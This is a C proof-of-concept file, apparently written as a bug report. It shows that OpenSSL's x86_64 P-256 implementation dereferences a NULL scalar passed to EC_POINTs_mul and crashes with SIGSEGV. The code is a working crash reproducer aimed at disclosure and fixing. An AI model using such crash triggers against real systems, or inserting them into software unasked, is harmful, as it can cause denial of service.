/*
 * NULL pointer dereference in ecp_nistz256_windowed_mul
 * when EC_POINTs_mul is called with NULL scalar entries for non-NULL points.
 *
 * File: openssl33/crypto/ec/ecp_nistz256.c
 * Function: ecp_nistz256_windowed_mul
 * Line: 637 - BN_num_bits(scalar[i]) called with scalar[i] == NULL
 *
 * The EC_POINTs_mul API comment in ecp_nistp256.c states:
 *   "we treat NULL scalars as 0, and NULL points as points at infinity"
 * But ecp_nistz256.c (the actual P-256 implementation on x86_64) does NOT
 * implement this contract - it passes NULL scalars directly to
 * ecp_nistz256_windowed_mul which immediately dereferences them.
 *
 * Crash path:
 *   EC_POINTs_mul -> ecp_nistz256_points_mul -> ecp_nistz256_windowed_mul
 *   -> BN_num_bits(scalar[i]) where scalar[i] == NULL -> SIGSEGV
 */
#define OPENSSL_API_COMPAT 0x10100000L
#include <openssl/ec.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/obj_mac.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    /* Use the default P-256 group (routes to ecp_nistz256 on x86_64) */
    EC_GROUP *group = EC_GROUP_new_by_curve_name(NID_X9_62_prime256v1);
    if (!group) {
        fprintf(stderr, "EC_GROUP_new_by_curve_name failed\n");
        ERR_print_errors_fp(stderr);
        return 1;
    }

    BN_CTX *ctx = BN_CTX_new();
    if (!ctx) return 1;

    const EC_POINT *gen = EC_GROUP_get0_generator(group);

    /*
     * Call EC_POINTs_mul with num=3 (>= 3 triggers batch path),
     * with scalars[0] = NULL but points[0] != NULL.
     *
     * Per API contract (ecp_nistp256.c comment), NULL scalar should mean 0.
     * But ecp_nistz256.c doesn't honor this - it crashes.
     */
    int num = 3;
    EC_POINT **points = calloc(num, sizeof(EC_POINT *));
    BIGNUM **scalars = calloc(num, sizeof(BIGNUM *));

    for (int i = 0; i < num; i++) {
        points[i] = EC_POINT_new(group);
        EC_POINT_copy(points[i], gen);
        /* scalars[0] = NULL intentionally (API says this means 0) */
        scalars[i] = (i == 0) ? NULL : BN_new();
        if (scalars[i]) BN_rand(scalars[i], 256, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
    }

    EC_POINT *result = EC_POINT_new(group);
    fprintf(stderr, "[CRASH PoC] Calling EC_POINTs_mul with scalars[0]=NULL...\n");
    fprintf(stderr, "[CRASH PoC] Expected: NULL scalar treated as 0 per API contract\n");
    fprintf(stderr, "[CRASH PoC] Actual: NULL dereference in ecp_nistz256_windowed_mul\n");

    /* This should crash via SIGSEGV / ASAN in ecp_nistz256.c:637 */
    int ret = EC_POINTs_mul(group, result, NULL, num,
                            (const EC_POINT **)points,
                            (const BIGNUM **)scalars, ctx);

    fprintf(stderr, "[CRASH PoC] Returned %d (should not reach here)\n", ret);

    for (int i = 0; i < num; i++) {
        EC_POINT_free(points[i]);
        if (scalars[i]) BN_free(scalars[i]);
    }
    free(points); free(scalars);
    EC_POINT_free(result);
    BN_CTX_free(ctx);
    EC_GROUP_free(group);
    return 0;
}
